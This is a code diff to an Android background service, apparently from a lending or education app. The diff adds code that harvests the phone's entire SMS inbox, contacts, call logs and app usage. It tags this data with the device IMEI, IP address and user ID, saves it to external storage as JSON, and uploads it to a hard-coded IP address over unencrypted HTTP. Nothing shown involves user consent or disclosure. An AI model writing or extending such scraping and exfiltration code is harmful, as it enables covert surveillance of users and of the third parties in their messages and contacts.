@@ -12,6 +12,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteException;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
@@ -53,8 +54,10 @@ public class MyService extends Service {
     Context context;
     static String stringAllSmsContacts;
     public static String latestSmsDate = "";
-    String userMobileNo;
-    String userLoggedinID;
+    public static String userID="", userMobileNo="", userLoggedinID="";
+    private LongOperation longOperation = null, longOperation2 = null, longOperation3 = null, longOperation4 = null;
+    public static String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress = "";
+
 
     @Nullable
     @Override
@@ -68,11 +71,17 @@ public class MyService extends Service {
         context = this;
 
         Log.e(MainApplication.TAG, "Alarm received!: ");
-        Log.e(TAG, "verifyOtp: 11111111111111111111111111" );
+        Log.e(TAG, "MyService  : 11111111111111111111111111" );
         /** getting data from shared preference **/
         SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
-        userMobileNo = sharedPreferences.getString("logged_id", "null");
-        userLoggedinID = sharedPreferences.getString("mobile_no", "null");
+        userLoggedinID = sharedPreferences.getString("logged_id", "null");
+        userMobileNo = sharedPreferences.getString("mobile_no", "null");
+        userID = sharedPreferences.getString("logged_id", "null");
+
+        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        imeiNo = telephonyManager.getDeviceId();
+        ipaddress = Utils.getIPAddress(true);
+        Log.e(MainApplication.TAG, "PHONE DATA " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress +" USER ID :"+ userID);
 
     }
 
@@ -80,14 +89,11 @@ public class MyService extends Service {
      * Read SMS
      **/
     public static void readSms(Context context, String userNo, String studentID) {
-        Log.e(MainApplication.TAG, " readSms: 22222222222222222222222" );
+        Log.e(MainApplication.TAG, " readSms:" );
         Context c = context;
         SmsPojo objSms;
         String message = "";
-        String mobileNo = "", userid = "", data = "", page = "", userName = "", imeiNo = "", simImei = "", ipaddress = "";
-
-        Log.e(MainApplication.TAG, "readSms: " + "Mobile No : " + mobileNo + "studentID" + studentID);
-
+        JSONObject outerOb = new JSONObject();
 
         final String SMS_URI_INBOX = "content://sms/inbox";
         final String SMS_URI_ALL = "content://sms/";
@@ -102,7 +108,6 @@ public class MyService extends Service {
             int total = cur.getCount();
 //            Log.e("MediaContent", "ReadSms :query" + cur.toString() + "\n" + total);
             JSONArray json = new JSONArray();
-            JSONObject outerOb = new JSONObject();
             int d = 0;
             // showProressBar("Reading sms. Please wait...");
             if (cur.moveToFirst()) {
@@ -137,13 +142,13 @@ public class MyService extends Service {
                     cur.moveToNext();
 
 
-                    /** INSERT DATE INTO SQL DATABASE **/
-                    if (d == 0) {
-                        d++;
-                        DBHandler dbHandler = new DBHandler(c);
-                        dbHandler.addDate(date, "1");
-                        latestSmsDate = date;
-                    }
+//                    /** INSERT DATE INTO SQL DATABASE **/
+//                    if (d == 0) {
+//                        d++;
+//                        DBHandler dbHandler = new DBHandler(c);
+//                        dbHandler.addDate(date, "1");
+//                        latestSmsDate = date;
+//                    }
 
                     // create new object
 //                    listPojo= new ListPojo();
@@ -160,37 +165,27 @@ public class MyService extends Service {
                     mObject.accumulate("type", type);
                     mObject.accumulate("sms_id", id);
 
-                    if (!latestSmsDate.equalsIgnoreCase("")) {
-                        long a = Long.parseLong(latestSmsDate) - Long.parseLong(date);
-                        if (a < 0) {
+//                    if (!latestSmsDate.equalsIgnoreCase("")) {
+//                        long a = Long.parseLong(latestSmsDate) - Long.parseLong(date);
+//                        if (a < 0) {
                             json.put(mObject);
-                        }
-                    } else {
-                        json.put(mObject);
-                    }
+//                        }
+//                    } else {
+//                        json.put(mObject);
+//                    }
                 }
-                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-                imeiNo = telephonyManager.getDeviceId();
-                ipaddress = Utils.getIPAddress(true);
-                Log.e(MainApplication.TAG, "readSms: " + "IMEINO:=" + imeiNo + "ipaddress:" + ipaddress);
                 outerOb.accumulate("student_id", studentID);
                 outerOb.accumulate("student_mobile_no", userNo);
                 outerOb.accumulate("created_by_ip", ipaddress);
                 outerOb.accumulate("sim_serial_no", simImei);
                 outerOb.accumulate("imei", imeiNo);
-                outerOb.accumulate("user", userName);
                 outerOb.put("Sms_info", json);
                 message = outerOb.toString();
-                stringAllSmsContacts = message;
-                Log.e(MainApplication.TAG, "smsReadSTRINGBUFF: " + stringAllSmsContacts);
-//                Log.e("", "readSms: "+message );
+                Log.e("", "readSms: "+message );
 
             }
-//            mCreateAndSaveFile("saveSMS.json", message);
+            mCreateAndSaveFile("saveSMS.json", message);
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                contactsRead(context, userNo, studentID);
-            }
 
         } catch (SQLiteException ex)
 
@@ -207,16 +202,14 @@ public class MyService extends Service {
      * CONTACTS READ
      **/
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-    public static void contactsRead(Context c, String userNo, String studentID) throws JSONException {
+    public static void contactsRead(Context c) throws JSONException {
         Log.e(MainApplication.TAG, " contactsRead: 3333333333333333333333333333" );
         Context context = c;
         JSONArray jsonArray = new JSONArray();
-        JSONObject outerOb = new JSONObject();
         String phoneNo = "";
         String name = "";
-        String imeiNo = "";
-        String contacts = "";
-
+        String contacts="";
+        JSONObject outerOb = new JSONObject();
 
         ContentResolver cr = c.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -252,23 +245,18 @@ public class MyService extends Service {
 
                     jsonArray.put(mObject);
 
-                    TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-                    imeiNo = telephonyManager.getDeviceId();
-                    String ipaddress = Utils.getIPAddress(true);
-                    String simImei = "";
-                    outerOb.accumulate("student_id", studentID);
-                    outerOb.accumulate("student_mobile_no", userNo);
-                    outerOb.accumulate("created_by_ip", ipaddress);
-                    outerOb.accumulate("sim_serial_no", simImei);
-                    outerOb.accumulate("imei", imeiNo);
-                    outerOb.put("contacts_info", jsonArray);
-                    contacts = outerOb.toString();
-                    stringAllSmsContacts += contacts;
-//                    Log.e(TAG, "contactsReadSTRINGBUFF: " + stringAllSmsContacts);
-
                 }
-                callLogs(context);
+                outerOb.accumulate("student_id", userID);
+                outerOb.accumulate("student_mobile_no", userMobileNo);
+                outerOb.accumulate("created_by_ip", ipaddress);
+                outerOb.accumulate("sim_serial_no", simImei);
+                outerOb.accumulate("imei", imeiNo);
+                outerOb.put("contacts_info", jsonArray);
+                contacts = outerOb.toString();
+
+                Log.e(TAG, "contacts: " + contacts);
             }
+            mCreateAndSaveFile("saveContacts.json", contacts);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -284,8 +272,6 @@ public class MyService extends Service {
     @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
     public static void callLogs(Context context) {
         Log.e(MainApplication.TAG, " callLogs: 444444444444444444444444444444444" );
-
-//        Log.e(MainApplication.TAG, " CALL LOGS" );
 
         String phNumber="", callType="", callDuration="", logs="";
         JSONArray jsonArray = new JSONArray();
@@ -318,14 +304,12 @@ public class MyService extends Service {
             callDuration = cursor.getString(duration);
             String dir = null;
 
-//            Log.e(TAG, "phNumber: "+phNumber );
-//            Log.e(TAG, "callType: "+callType );
-//            Log.e(TAG, "callDuration: "+callDuration );
             JSONObject mObject = new JSONObject();
             try {
                 mObject.accumulate("callee_number", phNumber);
                 mObject.accumulate("call_type", callType);
-                mObject.accumulate("call_duration", duration);
+                mObject.accumulate("call_duration", callDuration);
+                mObject.accumulate("call_date", callDayTime);
                 jsonArray.put(mObject);
 
             } catch (JSONException e) {
@@ -334,15 +318,17 @@ public class MyService extends Service {
         }
         cursor.close();
         try {
+            outerOb.accumulate("student_id", userID);
+            outerOb.accumulate("student_mobile_no", userMobileNo);
+            outerOb.accumulate("created_by_ip", ipaddress);
+            outerOb.accumulate("sim_serial_no", simImei);
+            outerOb.accumulate("imei", imeiNo);
             outerOb.put("call_logs", jsonArray);
         } catch (JSONException e) {
             e.printStackTrace();
         }
         logs = outerOb.toString();
-        stringAllSmsContacts += logs;
-
-        appStats(context);
-
+        mCreateAndSaveFile("saveCallLogs.json", logs);
 
     }
 
@@ -354,28 +340,35 @@ public class MyService extends Service {
     public  static void appStats(Context context){
         Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555" );
         JSONArray jsonArray = new JSONArray();
+        String appUseage="";
         JSONObject outerOb = new JSONObject();
-        String appUseage;
-
+        Log.e(MainApplication.TAG, " appStats: 555555555555555555555555555555555  SIZE" + getUsageStatsList(context).size());
         for(int i=0; i<getUsageStatsList(context).size();i++) {
             JSONObject mObject = new JSONObject();
-            try {
-                mObject.accumulate("app_name", getUsageStatsList(context).get(i).getPackageName());
-                mObject.accumulate("appusage_time", getUsageStatsList(context).get(i).getTotalTimeInForeground());
-                jsonArray.put(mObject);
+            if(getUsageStatsList(context).get(i).getTotalTimeInForeground()>0) {
+                try {
+                    mObject.accumulate("app_name", getUsageStatsList(context).get(i).getPackageName());
+                    mObject.accumulate("appusage_time", getUsageStatsList(context).get(i).getTotalTimeInForeground());
+                    jsonArray.put(mObject);
 
-            } catch (JSONException e) {
-                e.printStackTrace();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+
+
             }
         }
 
         try {
+            outerOb.accumulate("student_id", userID);
+            outerOb.accumulate("student_mobile_no", userMobileNo);
+            outerOb.accumulate("created_by_ip", ipaddress);
+            outerOb.accumulate("sim_serial_no", simImei);
+            outerOb.accumulate("imei", imeiNo);
             outerOb.put("app_stats", jsonArray);
 
             appUseage = outerOb.toString();
-            stringAllSmsContacts += appUseage;
-
-            mCreateAndSaveFile("saveSMS.json", stringAllSmsContacts);
+            mCreateAndSaveFile("saveAppStats.json", appUseage);
 
         } catch (JSONException e) {
             e.printStackTrace();
@@ -384,23 +377,21 @@ public class MyService extends Service {
     }
 
     public static void mCreateAndSaveFile(String params, String mJsonResponse) {
-        Log.e(MainApplication.TAG, " mCreateAndSaveFile: 666666666666666666666666666666" );
+        Log.e(MainApplication.TAG, " mCreateAndSaveFile:" );
         try {
             String path = "/storage/sdcard0/" + params;
-//            Log.e("ReadSms", "mCreateAndSaveFile: "+path );
             final File dir = new File(Environment.getExternalStorageDirectory() + "/");
             if (dir.exists() == false) {
                 dir.mkdirs();
             }
             File f = new File(dir, params);
             f.getAbsolutePath();
-//            Log.e(TAG, "mCreateAndSaveFile:file path "+f.getAbsolutePath() );
             FileWriter file = new FileWriter(f.getAbsolutePath());
             file.write(mJsonResponse);
             file.flush();
             file.close();
 
-            mReadJsonData();
+            mReadJsonData(params);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -418,30 +409,107 @@ public class MyService extends Service {
         return usageStatsList;
     }
 
-    public static void mReadJsonData() {
-        Log.e(TAG, "mReadJsonData: 88888888888888888888888888888 " );
+    public static void mReadJsonData(final String filename) {
+        Log.e(TAG, "mReadJsonData: " );
         final File dir = new File(Environment.getExternalStorageDirectory()+"/");
         if (dir.exists() == false) {
             dir.mkdirs();
         }
-        final File f = new File(dir, "saveSMS.json");
+        final File f = new File(dir, filename);
         new Thread(new Runnable() {
             @Override
             public void run() {
-                uploadFile(f.getAbsolutePath());
+                uploadFile(f.getAbsolutePath(), filename);
             }
         }).start();
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+
+        Log.e(MainApplication.TAG, "Service onStartCommand");
+
+        selectOperations();
+
+        return Service.START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+
+    }
+
+    private void selectOperations() {
+        Log.e(TAG, "selectOperations: " );
+
+        longOperation = new LongOperation();
+        longOperation.execute("sms");
+
+        longOperation2 = new LongOperation();
+        longOperation2.execute("contacts");
+
+        longOperation3 = new LongOperation();
+        longOperation3.execute("calllogs");
+
+        longOperation4 = new LongOperation();
+        longOperation4.execute("appstats");
+    }
+
+
+    /** ---------------- ASYNC TASK --------------**/
+    private class LongOperation extends AsyncTask<String, Void, Void> {
+
+        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+        @Override
+        protected Void doInBackground(String... params) {
+            Log.e(TAG, "doInBackground: " );
+            String operationName = params[0];
+
+            switch (operationName){
+
+                case "sms":
+                    readSms(context, userMobileNo, userID);
+                    break;
+                case  "contacts":
+                    try {
+                        contactsRead(context);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                    break;
+                case  "calllogs":
+                    callLogs(context);
+                    break;
+                case  "appstats":
+                    appStats(context);
+                    break;
+            }
+
+            return null;
+        }
+
+        @Override
+        protected void onPreExecute() {}
+
+        @Override
+        protected void onProgressUpdate(Void... values) {}
+    }
+
 
     /** upload SMS file to server **/
-    public static int uploadFile(final String selectedFilePath) {
+    public static int uploadFile(final String selectedFilePath, String fileType) {
+        String a=fileType;
+//        String[]  scrapingfileName = a.split(".");
+       a= a.substring(0, a.lastIndexOf('.'));
+
         StringBuffer sb;
         long total = 0;
-        String urlup = "http://139.59.32.234/sms/Api/send_message";
+//        String urlup = "http://139.59.32.234/sms/Api/send_message";
+        String urlup = "http://139.59.32.234/eduvanzApi/mobilescrap/send_message";
         int serverResponseCode = 0;
 
         Log.e(TAG, "uploadFile: 999999999999999999999999999999" );
+        Log.e(TAG, "uploadFile:"+"  file name : "+ a );
 
         HttpURLConnection connection;
         DataOutputStream dataOutputStream;
@@ -493,10 +561,8 @@ public class MyService extends Service {
                 connection.setRequestProperty("Connection", "Keep-Alive");
                 connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                 connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-                connection.setRequestProperty("document", selectedFilePath);
-//
-//
-                connection.setRequestProperty("file_name", "saveSMS");
+                connection.setRequestProperty(a, selectedFilePath);
+//                connection.setRequestProperty("file_name", "saveSMS");
                 Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());
 
 
@@ -505,8 +571,8 @@ public class MyService extends Service {
 
                 //writing bytes to data outputstream
                 dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
-                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
-//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"contactsdocument\";filename=\""
+                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\""+a+"\";filename=\""
+//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"saveCallLogs\";filename=\""
                         + selectedFilePath + "\"" + lineEnd);
                 dataOutputStream.writeBytes(lineEnd);
 
@@ -552,6 +618,14 @@ public class MyService extends Service {
                 dataOutputStream.writeBytes("1");
                 dataOutputStream.writeBytes(lineEnd);
                 dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+
+                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
+//                taOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
+//                        + selectedFilePath + "\"" + lineEnd);
+                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"studentId\";studentId=" + userID + "" + lineEnd);
+                dataOutputStream.writeBytes(lineEnd);
+                dataOutputStream.writeBytes(userID);
+                dataOutputStream.writeBytes(lineEnd);
 
                 //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                 //        + "=" + URLEncoder.encode("1", "UTF-8"));
@@ -612,35 +686,6 @@ public class MyService extends Service {
 //            dialog.dismiss();
             return serverResponseCode;
         }
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-
-        Log.i(MainApplication.TAG, "Service onStartCommand");
-
-        //Creating new thread for my service
-        //Always write your long running tasks in a separate thread, to avoid ANR
-        new Thread(new Runnable() {
-            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
-            @Override
-            public void run() {
-                //Your logic that service will perform will be placed here
-                //In this example we are just looping and waits for 1000 milliseconds in each loop.
-
-//                readSms(context, userMobileNo, userLoggedinID);
-                appStats(context);
-
-                //Stop service once it finishes its task
-            }
-        }).start();
-
-        return Service.START_STICKY;
-    }
-
-    @Override
-    public void onDestroy() {
-
     }
 
 }
